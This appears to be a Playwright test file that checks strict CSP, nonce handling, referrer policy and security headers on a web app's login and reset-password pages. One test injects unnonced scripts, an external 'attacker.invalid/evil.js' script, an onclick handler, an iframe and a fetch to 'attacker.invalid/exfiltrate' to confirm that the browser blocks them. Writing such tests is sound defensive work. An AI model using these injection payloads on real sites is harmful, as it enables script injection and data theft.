import { expect, test } from "@playwright/test";
import { expectSecurityPageHealthy, mockSecurity } from "./helpers/account-security";

test.afterEach(async ({ page }) => expectSecurityPageHealthy(page));

for (const path of ["/giris", "/en/login"]) {
  test(`strict CSP survives hydration, refresh and forged headers: ${path}`, async ({ page }) => {
    await mockSecurity(page);
    await page.setExtraHTTPHeaders({ "x-nonce": "forged", "content-security-policy": "script-src *" });
    const first = await page.goto(path);
    expect(first?.status()).toBe(200);
    const policy = first!.headers()["content-security-policy"];
    const nonce = policy.match(/'nonce-([^']+)'/)![1];
    expect(nonce).not.toBe("forged");
    expect(policy).toContain("'strict-dynamic'");
    const scriptPolicy = policy.split(";").map((part) => part.trim()).find((part) => part.startsWith("script-src "));
    expect(scriptPolicy).toBeDefined();
    expect(scriptPolicy).not.toMatch(/'unsafe-inline'|'unsafe-eval'/);
    expect(first!.headers()["cache-control"]).toContain("no-store");
    expect(first!.headers()["cloudflare-cdn-cache-control"]).toBe("no-store");
    expect(first!.headers()["x-frame-options"]).toBe("DENY");
    expect(first!.headers()["x-content-type-options"]).toBe("nosniff");
    expect(first!.headers()["x-powered-by"]).toBeUndefined();
    await expect(page.locator('input[type="email"]')).toBeVisible();
    const scripts = await page.locator("script").evaluateAll((nodes) => nodes.map((node) => (node as HTMLScriptElement).nonce));
    expect(scripts.length).toBeGreaterThan(2);
    expect(scripts.every((value) => value === nonce)).toBe(true);
    const second = await page.reload();
    expect(second!.headers()["content-security-policy"]).not.toContain(`'nonce-${nonce}'`);
  });
}

test("browser blocks parser-injected inline/external scripts, handlers, frames and unapproved connections", async ({ page }) => {
  await mockSecurity(page);
  const unexpected: string[] = [];
  await page.route("https://attacker.invalid/**", (route) => { unexpected.push(route.request().url()); return route.abort(); });
  await page.route("**/csp-unauthorized.js", (route) => {
    unexpected.push(route.request().url());
    return route.fulfill({ contentType: "application/javascript", body: "document.documentElement.dataset.injected='same-origin'" });
  });
  await page.route("**/en/login", async (route) => {
    if (!route.request().isNavigationRequest()) return route.continue();
    const response = await route.fetch();
    const nonce = response.headers()["content-security-policy"].match(/'nonce-([^']+)'/)![1];
    const body = (await response.text()).replace("</body>", `<script nonce="${nonce}">try{new Function("document.documentElement.dataset.evaluated='yes'")()}catch(e){document.documentElement.dataset.evalBlocked='yes'};try{new WebAssembly.Module(new Uint8Array([0,97,115,109,1,0,0,0]));document.documentElement.dataset.wasmAllowed='yes'}catch(e){}</script><script>document.documentElement.dataset.injected='yes'</script><script src="/csp-unauthorized.js"></script><script src="https://attacker.invalid/evil.js"></script><button id="csp-handler" onclick="document.documentElement.dataset.handler='yes'">probe</button><iframe src="https://attacker.invalid/frame"></iframe></body>`);
    await route.fulfill({ response, body });
  });
  await page.goto("/en/login");
  await expect(page.locator('input[type="email"]')).toBeVisible();
  await page.locator("#csp-handler").click();
  expect(await page.locator("html").getAttribute("data-injected")).toBeNull();
  expect(await page.locator("html").getAttribute("data-handler")).toBeNull();
  expect(await page.locator("html").getAttribute("data-eval-blocked")).toBe("yes");
  expect(await page.locator("html").getAttribute("data-wasm-allowed")).toBe("yes");
  const blocked = await page.evaluate(async () => {
    try { await fetch("https://attacker.invalid/exfiltrate"); return false; } catch { return true; }
  });
  expect(blocked).toBe(true);
  expect(unexpected).toEqual([]);
});

test("theme bootstrap and SPA navigation preserve the original document nonce", async ({ page, context }) => {
  await mockSecurity(page);
  await context.addCookies([{ name: "mentor-theme", value: "dark", url: test.info().project.use.baseURL as string || process.env.PLAYWRIGHT_BASE_URL || "http://localhost:3100" }]);
  await page.goto("/en/login");
  await expect(page.locator("html")).toHaveClass(/dark/);
  const nonce = await page.locator("script[nonce]").first().evaluate((script) => (script as HTMLScriptElement).nonce);
  await page.locator('a[href="/en/forgot-password"]').click();
  await expect(page).toHaveURL(/\/en\/forgot-password$/);
  await expect(page.locator('input[type="email"]')).toBeVisible();
  expect(await page.locator("script[nonce]").first().evaluate((script) => (script as HTMLScriptElement).nonce)).toBe(nonce);
});

test("token documents do not send a Referer and static assets retain base protections", async ({ page, request }) => {
  await mockSecurity(page);
  let probeObserved = false;
  let referer: string | undefined;
  await page.route("**/sw.js?csp-referrer-probe=1", (route) => {
    probeObserved = true;
    referer = route.request().headers().referer;
    return route.fulfill({ contentType: "text/plain", body: "probe" });
  });
  const response = await page.goto("/en/reset-password?token=qa-dummy-token");
  expect(response!.headers()["referrer-policy"]).toBe("no-referrer");
  await page.evaluate(() => fetch("/sw.js?csp-referrer-probe=1").then((response) => response.text()));
  expect(probeObserved).toBe(true);
  expect(referer).toBeUndefined();
  const asset = await request.get("/sw.js");
  expect(asset.status()).toBe(200);
  expect(asset.headers()["x-content-type-options"]).toBe("nosniff");
  expect(asset.headers()["x-frame-options"]).toBe("DENY");
  expect(asset.headers()["content-security-policy"]).toBeUndefined();
});

test("Turnstile loader uses the active document nonce after SPA navigation", async ({ page }) => {
  test.skip(!process.env.NEXT_PUBLIC_TURNSTILE_SITE_KEY, "Requires the dedicated dummy-key build");
  const calls = await mockSecurity(page, { loadCaptchaScript: true, failure: true });
  await page.route("https://challenges.cloudflare.com/**", (route) => route.fulfill({
    status: 200, contentType: "application/javascript",
    body: `window.turnstile={render:function(container,options){container.dataset.securityCaptcha=options.action;setTimeout(function(){options.callback('qa-csp-token')},0);return 'qa-widget'},remove:function(){}}`,
  }));
  await page.goto("/en/legal/kvkk-aydinlatma");
  const nonce = await page.locator("script[nonce]").first().evaluate((script) => (script as HTMLScriptElement).nonce);
  await page.locator('a[href="/en/login"]').first().click();
  await expect(page).toHaveURL(/\/en\/login$/);
  await expect(page.locator('[data-security-captcha="login"]')).toBeAttached();
  expect(await page.locator('script[src*="challenges.cloudflare.com"]').evaluate((script) => (script as HTMLScriptElement).nonce)).toBe(nonce);
  await page.locator('input[type="email"]').fill("security@test.local");
  await page.locator('input[type="password"]').fill("Qa-test-password-123!");
  await page.locator('button[type="submit"]').click();
  await expect.poll(() => calls.login.length).toBe(1);
  expect(calls.login[0].turnstileToken).toBe("qa-csp-token");
});
